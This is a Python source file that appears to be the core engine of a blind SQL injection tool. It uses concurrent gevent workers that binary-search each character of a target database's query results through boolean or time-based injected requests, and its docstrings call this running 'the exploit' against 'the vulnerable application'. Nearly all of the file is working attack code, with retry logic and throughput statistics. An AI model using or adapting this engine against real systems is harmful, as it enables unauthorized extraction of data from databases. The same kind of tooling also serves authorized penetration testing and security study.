#file: technique.py

from .truth import Truth
from ..settings import *
from .exceptions import *

import gevent
from gevent.event import AsyncResult,Event
from gevent.coros import Semaphore
from gevent.queue import Queue
from gevent.pool import Pool
from time import time
from copy import copy


class Technique(object):
    '''
    This is a sql injection teqnique. Eg. Union based or Time based... Techniques need
    to implement at minimum the run method which is what actually launches the technique.
    Techniques will usually also take a user_query (query we are trying to run on the db).
    The class init init will (almost?) always take a make_request_func as a param. This
    option specifies the function to call to make an actual request. 
    '''
    def __init__(self,make_request_func,query):
        self.query = query
        self.make_request_func = make_request_func

        if type(self) == Technique:
            raise NotImplemented

    def run(self):
        '''
        run the exploit
        '''
        raise NotImplemented("technique.run")



class Character():
    def __init__(self,row_index,char_index,queue,row_die):
        '''
            :row_index  - what row this character is a part of (for rendering our Query)
            :char_index - what character in the row is this (for rendering our Query)
            :queue      - what queue will we push to. this queue will receive tuples in the
                          form of:
                             item=(self.row_index,self.char_index,self.char_val,comparator,asr)
            :row_die    - gevent.event.AsyncResult that gets fired when the row needs to die. the
                          value passed to this ASR's set() should be the char_index in this row
                          after which all Character()s need to kill themselves
        '''
        #row_die is an AsyncResult. We link our die method to and store the 
        #event so the die method can know if it should die (based on char_index emmitted by row_die)
        self.row_die = row_die
        self.row_die.rawlink(self._die_callback)
        #run_gl will store the greenlet running the run() method
        self.run_gl = None
        self.q = queue

        self.row_index = row_index
        self.char_index = char_index
        self.char_val = CHARSET[0]

        #these flags are used in computing the __str__, __repr__, and __eq__
        self.error = False
        self.working = False
        self.done = False
    
    def run(self):
        #make note of the current greenlet
        self.run_gl = gevent.getcurrent()

        low = 0
        high = CHARSET_LEN
        self.working = True        

        #binary search unless we hit an error
        while not self.error and self.working:
            mid = (low+high)//2
            self.char_val = CHARSET[mid]

            if low >= high:
                self.error = True
                self.row_die.set((self.char_index,AsyncResult()))
                break

            if self._test("<"):
                #print "data[%d][%d] > %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],ord(CHARSET[mid]))
                high = mid
            elif self._test(">"):
                #print "data[%d][%d] < %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],ord(CHARSET[mid]))
                low = mid + 1
            elif low < CHARSET_LEN and self._test("="):
                #print "data[%d][%d] = %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],ord(CHARSET[mid]))
                self.working = False
                break
            else:
                #if there isn't a value for the character we are working on, that means we went past the end of the row.
                #we set error and kill characters after us in the row.
                self.error = True
                self.row_die.set((self.char_index,AsyncResult()))
                break


            gevent.sleep(0)
            
        self.done = True
        self.working = False

        #clear the note regarding the running greenlet
        self.run_gl = None
    
    def get_status(self):
        if self.error: return "error"
        if self.working: return "working"
        if self.done: return "success"
        return "unknown"
    
    def _die_callback(self,event):
        #we do the next_event because the first event might be first for the last character. 
        #this way we can fire the die event multiple times if necessary
        die_index,next_event = self.row_die.get()
        if die_index  < self.char_index and self.run_gl:
            self.run_gl.kill(block=False)
            self.error = True
            self.done = True
            self.working = False
        else:
            self.row_die = next_event
            self.row_die.rawlink(self._die_callback)
    
    def _test(self,comparator):
        asr = AsyncResult()
        self.q.put(item=(self.row_index,self.char_index,self.char_val,comparator,asr))
        return asr.get()

    def __eq__(self,y):
        if y == "error":
            return self.error
            
        if y == "working":
            return self.working and (not self.error)
        
        if y == "success":
            return self.done and (not self.error)
        
        if y.hasattr('char_val'):
            return self.char_val == y.char_val
        
        return self.char_val == y
        
    def __ne__(self,y):
        return not self.__eq__(y)

    def __str__(self):
        # if error or not started yet return ''
        if self.error or (not self.working and not self.done): return ""
        # else return char_val
        return self.char_val

    def __repr__(self):
        # if error or not started yet return ''
        if self.error or (not self.working and not self.done): return ""
        # else return char_val
        return self.char_val
    
    def __hash__(self):
        # objects that override __eq__ cannot be hashed (cannot be added to a lot of structures like set()....). 
        return id(self)


class BlindTechnique(Technique):
    def __init__(self,truth = Truth(), *args, **kwargs):
        self.truth = truth
        self.rungl = None

        super(BlindTechnique,self).__init__(*args,**kwargs)

    def _reset(self):
        '''
        reset all the variables used for keeping track of internal state
        '''
        #an list of Character()s 
        self.results = []
        #an list of strings
        self.str_results = []
        #character generators take care of building the Character objects. we need one per row
        self.char_gens = []
        #make a row_generator
        self.row_gen = self._row_generator()
        #a queue for communications between Character()s and request_makers
        self.q = Queue()
        #"threads" that run the Character()s
        self.character_pool = Pool(self.concurrency)
        #"threads" that make requests
        self.request_makers = [gevent.spawn(self._request_maker) for i in range(self.concurrency)]
        #fire this event when shutting down
        self.shutting_down = Event()
        #use this as a lock to know when not to mess with self.results        
        self.results_lock = Semaphore(1)
        #request_count is the number of requests made on the current run
        self.request_count = 0
        #failure_count is the number of requests made on the current run
        self.failure_count = 0

    def _request_maker(self):
        '''
        this runs in a gevent "thread". It is a worker
        '''
        #keep going until we shut down the technique
        while True:
            #pull the info needed to make a request from the queue
            row_index,char_index,char_val,comparator,char_asyncresult = self.q.get()

            #build out our query object
            query = copy(self.query)
            query.set_option('user_query',self.user_query)
            query.set_option('row_index',str(row_index))
            query.set_option('char_index',str(char_index))
            query.set_option('char_val',str(ord(char_val)))
            query.set_option('sleep',str(self.sleep))
            query.set_option('comparator',comparator)
            query_string = query.render()

            self.request_count += 1

            count = 0
            response = None
            while response == None:
                try:
                    response = self.make_request_func(query_string)
                except SendRequestFailed:
                    self.failure_count += 1
                    response = None
                    gevent.sleep(.01 * 2 ** count)                    
                    if count == 10: raise SendRequestFailed('cant request')
                count += 1

            t = self.truth.test(response)

            char_asyncresult.set(t)

    def _row_generator(self):
        '''
        crease rows. mostly useful because it keeps track of row_index
        '''
        row_index = 0
        while True:
            self.char_gens.append(self._character_generator(row_index))
            self.results.append([])
            yield True
            row_index += 1

    def _character_generator(self,row_index):
        '''
        creates a Character object for us. this generator is useful just because it keeps track of the char_index
        '''
        char_index = 1
        row_die_event = AsyncResult()
        while True:
            c = Character(\
                row_index   = row_index,\
                char_index  = char_index,\
                queue       = self.q,\
                row_die     = row_die_event)
            char_index += 1
            #fire off the Character within our Pool.
            self.character_pool.spawn(c.run)
            yield c

    def _adjust_row_lengths(self):
        ''' 
        if a row is full of "success", but we havent reached the end yet (the last elt isnt "error")
        then we need to increase the row_len.
        '''
        while not self.shutting_down.is_set():
            self.results_lock.acquire()

            unused_threads = self.concurrency - reduce(lambda x,row: x + row.count('working'),self.results,0)
            rows_working = len(filter(lambda row: 'working' in row,self.results))
            if rows_working == 0:
                add_to_rows = self.row_len
            else:
                add_to_rows = unused_threads//rows_working
                add_to_rows = [add_to_rows,1][add_to_rows==0]

            for row_index in range(len(self.results)):
                #if the row isn't finished or hasn't been started yet, we add Character()s to the row
                if 'error' not in self.results[row_index]:
                    self.results[row_index] += [self.char_gens[row_index].next() for i in range(add_to_rows)]
            self.results_lock.release()
            gevent.sleep(.3)

    def _add_rows(self):
        '''
        look at how many gevent "threads" are being used and add more rows to correct this
        '''
        rows_to_work_on = self.concurrency // self.row_len
        rows_to_work_on = [rows_to_work_on,1][rows_to_work_on == 0]
        while not self.shutting_down.is_set():
            # add rows until we realize that we are at the end of rows
            if len(self.results) and filter(lambda row: len(row) and row[0] == 'error',self.results):
                break
            
            working_rows = len(filter(lambda row: 'working' in row,self.results))
            [self.row_gen.next() for row in range(rows_to_work_on - working_rows)]
            gevent.sleep(.3)
        
        while not self.shutting_down.is_set():
            self.results_lock.acquire()
            # delete any rows that shouldn't have been added in the first place
            errored = filter(lambda ri: len(self.results[ri]) and self.results[ri][0] == 'error',range(len(self.results)))
            if errored:
                end = min(errored)
                for ri in xrange(len(self.results)-1,end-1,-1):
                    del(self.results[ri])

            self.results_lock.release()    
            #if there aren't going to be any more rows in need of deletion we can stop this nonsense
            if self.results and self.results[-1][0] == 'success':
                break
            gevent.sleep(.3)

    def _keep_going(self):
        '''
        Look at the results gathered so far and determine if we should keep going. we want to keep going until we have an empty row
        '''
        while not self.shutting_down.is_set():
            r = filter(lambda row:'error' not in row or 'working' in row[:row.index('error')],self.results)
            if self.results and not r:
                self.shutting_down.set()
            gevent.sleep(.3)

    def _run(self):
        kg_gl = gevent.spawn(self._keep_going)
        ar_gl = gevent.spawn(self._add_rows)
        arl_gl = gevent.spawn(self._adjust_row_lengths)

        kg_gl.join()
        ar_gl.join()
        arl_gl.join()

        self.character_pool.join()
        gevent.killall(self.request_makers)
        gevent.joinall(self.request_makers)

    def run(self,user_query,concurrency=20,row_len=2,sleep=0):
        '''
        run the exploit. returns the data retreived.
            :user_query     this is the query whose result we are trying to get out of the vulnerable application. 
            :concurrency    how many gevent "threads" to use. This is useful for throttling the attack.
            :row_len        An estimated starting point for the length of rows. This will get adjusted as the attack goes on.
            :sleep          if this is time based blind SQLi, then we will need to know how much to tell the DB to sleep.
        '''
        self.run_start_time = time()

        if self.rungl != None:
            self.rungl.kill()

        self.row_len = row_len
        self.sleep = sleep
        self.user_query = user_query
        self.concurrency = concurrency

        #start fresh
        self._reset()

        self.rungl = gevent.spawn(self._run)
        
        return self.rungl

    def get_results(self,color=False):
        if not color:
            return filter(lambda row: row != '',[''.join([str(x) for x in row]) for row in self.results])
        
        rval = []
        running_status = "unknown"

        for row in self.results:
            if len(row):
                    running_status = "unknown"
                    row_string = ""
                    for c in row:
                        cstatus = c.get_status()
                        if cstatus != running_status:
                            row_string += COLORS[cstatus]
                            running_status = cstatus
                        row_string += str(c)
                    rval.append(row_string + COLORS['endc'])
        return rval
            

        #return filter(lambda row: row != '',[''.join([COLORS[x.get_status()] + str(x) + COLORS['endc'] for x in row]) for row in self.results])        


    def get_status(self):
        status = ""
        status += "requests: %d\t" % self.request_count
        status += "failures: %d\t" % self.failure_count
        status += "rows: %d\t" % reduce(lambda x,row: ('success' in row)+x,self.results,0)
        status += "working threads: %d\t" %  reduce(lambda x,row: x + row.count('working'),self.results,0)
        
        chars = reduce(lambda x,row: row.count('success') + x,self.results,0)
        status += "chars: %d\t" % chars

        if self.run_start_time:
            run_time = time() - self.run_start_time
            status += "time: %f\t" % run_time
            status += "char/sec: %f\t" % (chars/run_time)

        if chars: rc = float(self.request_count) / chars
        else: rc = 0.0
        status += "req/char: %f\t" % rc

        return status
